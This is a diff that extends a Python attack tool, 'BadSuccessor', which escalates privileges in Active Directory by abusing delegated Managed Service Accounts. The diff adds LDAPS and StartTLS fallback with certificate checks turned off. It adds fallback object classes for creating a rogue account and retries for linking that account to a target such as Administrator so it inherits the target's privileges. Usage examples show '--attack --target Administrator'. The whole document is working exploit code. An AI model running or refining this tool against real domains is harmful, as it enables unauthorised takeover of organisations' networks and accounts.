@@ -113,17 +113,30 @@ class BadSuccessor:
 
         return None, None
 
-    def establish_ldap_connection(self, dc_ip, domain, username, password):
+    def establish_ldap_connection(self, dc_ip, domain, username, password, use_ssl=False, port=None):
         """Establish authenticated LDAP connection"""
         try:
-            server = Server(dc_ip, port=389, get_info=ALL)
+            # Determine port based on SSL preference
+            if port is None:
+                port = 636 if use_ssl else 389
+
+            protocol = "LDAPS" if use_ssl else "LDAP"
+            self.log(f"Attempting {protocol} connection to {dc_ip}:{port}", "INFO")
+
+            # Create server with SSL if requested
+            if use_ssl:
+                import ssl
+                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
+                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
+            else:
+                server = Server(dc_ip, port=port, get_info=ALL)
+
             user_dn = f"{domain}\\{username}"
 
-            self.log(f"Connecting to LDAP server: {dc_ip}", "INFO")
             conn = Connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)
 
             if conn.bind():
-                self.log("LDAP authentication successful", "SUCCESS")
+                self.log(f"{protocol} authentication successful", "SUCCESS")
 
                 # Get domain DN
                 domain_parts = domain.split('.')
@@ -132,44 +145,129 @@ class BadSuccessor:
 
                 return conn
             else:
-                self.log("LDAP authentication failed", "ERROR")
+                self.log(f"{protocol} authentication failed", "ERROR")
                 return None
 
         except Exception as e:
-            self.log(f"LDAP connection error: {e}", "ERROR")
+            self.log(f"{protocol} connection error: {e}", "ERROR")
             return None
 
-    def check_server_2025_dcs(self):
-        """Check for Windows Server 2025 domain controllers"""
-        self.log("Checking for Windows Server 2025 Domain Controllers...")
+    def establish_connection_with_fallback(self, dc_ip, domain, username, password, prefer_ssl=True, custom_port=None):
+        """Try LDAPS first, fallback to LDAP if needed"""
+
+        if custom_port:
+            # Use custom port without fallback
+            use_ssl = custom_port == 636
+            return self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, custom_port)
+
+        if prefer_ssl:
+            # Try LDAPS first
+            self.log("Attempting LDAPS connection (port 636)...", "INFO")
+            conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl=True)
+            if conn:
+                return conn
+
+            self.log("LDAPS failed, falling back to LDAP...", "WARNING")
+
+        # Try standard LDAP
+        self.log("Attempting LDAP connection (port 389)...", "INFO")
+        conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl=False)
+        if conn:
+            return conn
+
+        # Try LDAP with StartTLS
+        self.log("Attempting LDAP with StartTLS...", "INFO")
+        try:
+            import ssl
+            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
+            server = Server(dc_ip, port=389, tls=tls, get_info=ALL)
+            user_dn = f"{domain}\\{username}"
+
+            conn = Connection(server, user=user_dn, password=password, authentication=NTLM)
+            if conn.bind():
+                conn.start_tls()
+                self.log("LDAP with StartTLS successful", "SUCCESS")
+
+                # Get domain DN
+                domain_parts = domain.split('.')
+                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
+                self.log(f"Domain DN: {self.domain_dn}", "INFO")
+
+                return conn
+        except Exception as e:
+            self.log(f"StartTLS failed: {e}", "WARNING")
+
+        return None
+
+    def check_schema_support(self):
+        """Check what dMSA-related schema elements are available"""
+        self.log("Checking schema support for dMSA features...")
 
         try:
-            search_filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+            # Check for dMSA object classes in schema
+            schema_dn = f"CN=Schema,CN=Configuration,{self.domain_dn}"
+
+            # Check for msDS-DelegatedManagedServiceAccount
+            dmsa_class_filter = "(cn=msDS-DelegatedManagedServiceAccount)"
             self.connection.search(
-                search_base=self.domain_dn,
-                search_filter=search_filter,
-                attributes=['name', 'operatingSystem', 'operatingSystemVersion']
+                search_base=schema_dn,
+                search_filter=dmsa_class_filter,
+                attributes=['cn', 'objectClassCategory']
             )
 
-            server_2025_found = False
-            for entry in self.connection.entries:
-                os_info = str(entry.operatingSystem) if entry.operatingSystem else "Unknown"
-                if "2025" in os_info or "Server 2025" in os_info:
-                    self.log(f"Found Server 2025 DC: {entry.name} - {os_info}", "WARNING")
-                    server_2025_found = True
-                elif "Server" in os_info:
-                    self.log(f"Found DC: {entry.name} - {os_info}", "INFO")
+            dmsa_supported = len(self.connection.entries) > 0
 
-            if server_2025_found:
-                self.log("dMSA feature likely available (Server 2025 DC found)", "SUCCESS")
-                return True
+            # Check for msDS-GroupManagedServiceAccount (gMSA)
+            gmsa_class_filter = "(cn=msDS-GroupManagedServiceAccount)"
+            self.connection.search(
+                search_base=schema_dn,
+                search_filter=gmsa_class_filter,
+                attributes=['cn', 'objectClassCategory']
+            )
+
+            gmsa_supported = len(self.connection.entries) > 0
+
+            # Check for critical attributes
+            attr_checks = [
+                'msDS-ManagedAccountPrecededByLink',
+                'msDS-DelegatedMSAState',
+                'msDS-GroupMSAMembership'
+            ]
+
+            supported_attrs = []
+            for attr in attr_checks:
+                attr_filter = f"(cn={attr})"
+                self.connection.search(
+                    search_base=schema_dn,
+                    search_filter=attr_filter,
+                    attributes=['cn']
+                )
+                if len(self.connection.entries) > 0:
+                    supported_attrs.append(attr)
+
+            # Report findings
+            if dmsa_supported:
+                self.log("✓ Full dMSA support detected (Server 2025)", "SUCCESS")
+            elif gmsa_supported:
+                self.log("✓ gMSA support detected (Server 2012+)", "SUCCESS")
             else:
-                self.log("No Server 2025 DCs found - dMSA feature may not be available", "WARNING")
-                return False
+                self.log("✗ No managed service account support detected", "WARNING")
+
+            self.log(f"Supported attributes: {supported_attrs}", "INFO")
+
+            return {
+                'dmsa_supported': dmsa_supported,
+                'gmsa_supported': gmsa_supported,
+                'supported_attributes': supported_attrs
+            }
 
         except Exception as e:
-            self.log(f"Error checking DCs: {e}", "ERROR")
-            return False
+            self.log(f"Error checking schema: {e}", "WARNING")
+            return {
+                'dmsa_supported': False,
+                'gmsa_supported': False,
+                'supported_attributes': []
+            }
 
     def enumerate_ou_permissions(self):
         """Enumerate OUs where current user might have create permissions"""
@@ -226,30 +324,64 @@ class BadSuccessor:
         try:
             dmsa_dn = f"CN={dmsa_name},{ou_dn}"
 
-            # dMSA object attributes
-            attributes = {
-                'objectClass': ['top', 'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'],
-                'sAMAccountName': f"{dmsa_name}$",
-                'userAccountControl': '4096',  # WORKSTATION_TRUST_ACCOUNT
-                'msDS-DelegatedMSAState': '0',  # Initial state
-                'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
-                'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"],
-                'msDS-SupportedEncryptionTypes': '28'  # AES256, AES128, RC4
-            }
+            # Try different object class combinations based on schema availability
+            object_class_variations = [
+                # Full dMSA (Server 2025)
+                ['top', 'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'],
+                # Fallback to gMSA (Server 2012+)
+                ['top', 'msDS-GroupManagedServiceAccount'],
+                # Computer object fallback
+                ['top', 'person', 'organizationalPerson', 'user', 'computer']
+            ]
 
-            # Add the object
-            success = self.connection.add(dmsa_dn, attributes=attributes)
+            for i, object_classes in enumerate(object_class_variations):
+                self.log(f"Attempting object creation with classes: {object_classes}", "INFO")
 
-            if success:
-                self.log(f"Successfully created dMSA: {dmsa_dn}", "SUCCESS")
-                return dmsa_dn
-            else:
-                self.log(f"Failed to create dMSA: {self.connection.result}", "ERROR")
-                return None
+                # Base attributes for all attempts
+                base_attributes = {
+                    'objectClass': object_classes,
+                    'sAMAccountName': f"{dmsa_name}$",
+                    'userAccountControl': '4096',  # WORKSTATION_TRUST_ACCOUNT
+                }
+
+                # Add dMSA-specific attributes if using dMSA classes
+                if 'msDS-DelegatedManagedServiceAccount' in object_classes:
+                    base_attributes.update({
+                        'msDS-DelegatedMSAState': '0',  # Initial state
+                        'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
+                        'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"],
+                        'msDS-SupportedEncryptionTypes': '28'  # AES256, AES128, RC4
+                    })
+                elif 'msDS-GroupManagedServiceAccount' in object_classes:
+                    base_attributes.update({
+                        'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
+                        'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"],
+                        'msDS-SupportedEncryptionTypes': '28'
+                    })
+                else:
+                    # Computer object attributes
+                    base_attributes.update({
+                        'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
+                        'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"]
+                    })
+
+                # Attempt to create the object
+                success = self.connection.add(dmsa_dn, attributes=base_attributes)
+
+                if success:
+                    self.log(f"Successfully created object with classes: {object_classes}", "SUCCESS")
+                    return dmsa_dn, object_classes
+                else:
+                    self.log(f"Failed with classes {object_classes}: {self.connection.result}", "WARNING")
+                    if i < len(object_class_variations) - 1:
+                        self.log("Trying next object class variation...", "INFO")
+
+            self.log("All object class variations failed", "ERROR")
+            return None, None
 
         except Exception as e:
-            self.log(f"Error creating dMSA: {e}", "ERROR")
-            return None
+            self.log(f"Error creating object: {e}", "ERROR")
+            return None, None
 
     def get_user_dn(self, username):
         """Get the distinguished name of a user"""
@@ -273,26 +405,68 @@ class BadSuccessor:
             self.log(f"Error finding user: {e}", "ERROR")
             return None
 
-    def simulate_dmsa_migration(self, dmsa_dn, target_user_dn):
+    def simulate_dmsa_migration(self, dmsa_dn, target_user_dn, object_classes):
         """Simulate dMSA migration by setting the critical attributes"""
-        self.log(f"Simulating dMSA migration to target: {target_user_dn}")
+        self.log(f"Simulating migration to target: {target_user_dn}")
 
         try:
-            # Set msDS-ManagedAccountPrecededByLink to target user
-            changes = {
-                'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_user_dn])],
-                'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]  # Migration completed
-            }
+            changes = {}
+
+            # Set attributes based on object class capabilities
+            if 'msDS-DelegatedManagedServiceAccount' in object_classes:
+                self.log("Using full dMSA attributes", "INFO")
+                changes = {
+                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_user_dn])],
+                    'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]  # Migration completed
+                }
+            elif 'msDS-GroupManagedServiceAccount' in object_classes:
+                self.log("Using gMSA with custom attributes", "INFO")
+                # Try to add the dMSA-specific attributes to existing gMSA
+                changes = {
+                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_ADD, [target_user_dn])],
+                    'msDS-DelegatedMSAState': [(MODIFY_ADD, ['2'])]
+                }
+            else:
+                self.log("Using computer object - adding custom attributes", "WARNING")
+                # For computer objects, we'll try to add custom attributes
+                changes = {
+                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_ADD, [target_user_dn])],
+                    'msDS-DelegatedMSAState': [(MODIFY_ADD, ['2'])]
+                }
 
             success = self.connection.modify(dmsa_dn, changes)
 
             if success:
-                self.log("Successfully simulated dMSA migration!", "CRITICAL")
-                self.log("dMSA should now inherit target user's privileges", "CRITICAL")
+                self.log("Successfully simulated migration!", "CRITICAL")
+                self.log("Object should now reference target user", "CRITICAL")
                 return True
             else:
-                self.log(f"Failed to modify dMSA: {self.connection.result}", "ERROR")
-                return False
+                self.log(f"Failed to modify object: {self.connection.result}", "ERROR")
+
+                # Try alternative approach with individual attribute modifications
+                self.log("Trying individual attribute modifications...", "INFO")
+
+                # Try setting predecessor link first
+                success1 = self.connection.modify(dmsa_dn, {
+                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_user_dn])]
+                })
+
+                if success1:
+                    self.log("Successfully set predecessor link", "SUCCESS")
+                else:
+                    self.log(f"Failed to set predecessor link: {self.connection.result}", "WARNING")
+
+                # Try setting state
+                success2 = self.connection.modify(dmsa_dn, {
+                    'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]
+                })
+
+                if success2:
+                    self.log("Successfully set migration state", "SUCCESS")
+                else:
+                    self.log(f"Failed to set migration state: {self.connection.result}", "WARNING")
+
+                return success1 or success2
 
         except Exception as e:
             self.log(f"Error simulating migration: {e}", "ERROR")
@@ -429,8 +603,8 @@ def main():
         epilog="""
 Examples:
   python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --enumerate
-  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --attack --target Administrator
-  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --targets
+  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --ldaps --attack --target Administrator
+  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --port 3268 --targets
   python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --cleanup --dmsa-dn "CN=evil_dmsa,OU=temp,DC=domain,DC=com"
         """
     )
@@ -440,6 +614,10 @@ Examples:
     parser.add_argument('-u', '--username', required=True, help='Username for authentication')
     parser.add_argument('-p', '--password', required=True, help='Password for authentication')
     parser.add_argument('--dc-ip', help='Domain Controller IP (auto-discover if not specified)')
+    parser.add_argument('--ldaps', action='store_true', help='Force LDAPS (SSL) connection on port 636')
+    parser.add_argument('--ldap', action='store_true', help='Force LDAP (non-SSL) connection on port 389')
+    parser.add_argument('--port', type=int, help='Custom LDAP port (overrides --ldaps/--ldap)')
+    parser.add_argument('--no-ssl-fallback', action='store_true', help='Disable automatic LDAPS->LDAP fallback')
 
     # Actions
     parser.add_argument('--enumerate', action='store_true', help='Enumerate vulnerable OUs')
@@ -474,14 +652,36 @@ Examples:
             bs.log("Could not discover DC. Please specify --dc-ip", "ERROR")
             sys.exit(1)
 
-    # Establish LDAP connection
-    bs.connection = bs.establish_ldap_connection(bs.dc_ip, args.domain, args.username, args.password)
+    # Establish LDAP connection with SSL options
+    connection_options = {
+        'prefer_ssl': not args.ldap,  # Prefer SSL unless --ldap is specified
+        'custom_port': args.port
+    }
+
+    # Override SSL preference based on explicit flags
+    if args.ldaps:
+        connection_options['prefer_ssl'] = True
+    elif args.ldap:
+        connection_options['prefer_ssl'] = False
+
+    if args.no_ssl_fallback:
+        # Use single connection attempt without fallback
+        use_ssl = args.ldaps or (args.port == 636)
+        port = args.port or (636 if use_ssl else 389)
+        bs.connection = bs.establish_ldap_connection(bs.dc_ip, args.domain, args.username, args.password, use_ssl, port)
+    else:
+        # Use fallback mechanism
+        bs.connection = bs.establish_connection_with_fallback(
+            bs.dc_ip, args.domain, args.username, args.password,
+            connection_options['prefer_ssl'], connection_options['custom_port']
+        )
+
     if not bs.connection:
         bs.log("Failed to establish LDAP connection", "ERROR")
         sys.exit(1)
 
-    # Check for Server 2025 DCs
-    bs.check_server_2025_dcs()
+    # Check for Server 2025 DCs and schema support
+    schema_info = bs.check_schema_support()
 
     try:
         # Handle different modes
@@ -525,7 +725,7 @@ Examples:
             bs.log("Starting BadSuccessor attack...", "CRITICAL")
 
             # Step 1: Create dMSA
-            dmsa_dn = bs.create_dmsa_object(target_ou_dn, args.dmsa_name)
+            dmsa_dn, object_classes = bs.create_dmsa_object(target_ou_dn, args.dmsa_name)
             if not dmsa_dn:
                 return
 
@@ -535,7 +735,7 @@ Examples:
                 return
 
             # Step 3: Simulate migration
-            if not bs.simulate_dmsa_migration(dmsa_dn, target_user_dn):
+            if not bs.simulate_dmsa_migration(dmsa_dn, target_user_dn, object_classes):
                 return
 
             # Step 4: Verify configuration
